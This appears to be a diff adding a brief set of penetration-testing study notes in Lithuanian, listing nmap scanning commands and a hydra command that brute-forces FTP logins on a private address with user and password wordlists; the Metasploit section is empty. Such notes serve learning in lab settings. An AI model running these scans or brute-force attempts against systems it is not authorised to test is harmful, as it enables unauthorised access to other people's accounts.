@@ -1,0 +1,24 @@
+<--------------1.NMAP------------>
+
+	"sudo nmap -v -sT -sV -O scanme.nmap.org" - detalesnis skanavimas, parodo funkciju(services) kurie prisijunge prie portu versijas
+	kita panaši komanda: "nmap -p- -sV 192.168.1.103"
+
+<--------------1.NMAP------------>
+
+
+<--------------2.HYDRA------------>
+	bruteforce su word listais:
+		"hydra -L user.txt -P pass.txt 192.168.1.103 ftp -I"
+	
+	prisijungimas:
+		"ftp 192.168.1.103"
+		>user
+		>psw
+<--------------2.HYDRA------------>
+
+
+<--------------METASPLOIT------------>
+	
+	
+
+<--------------METASPLOIT------------>
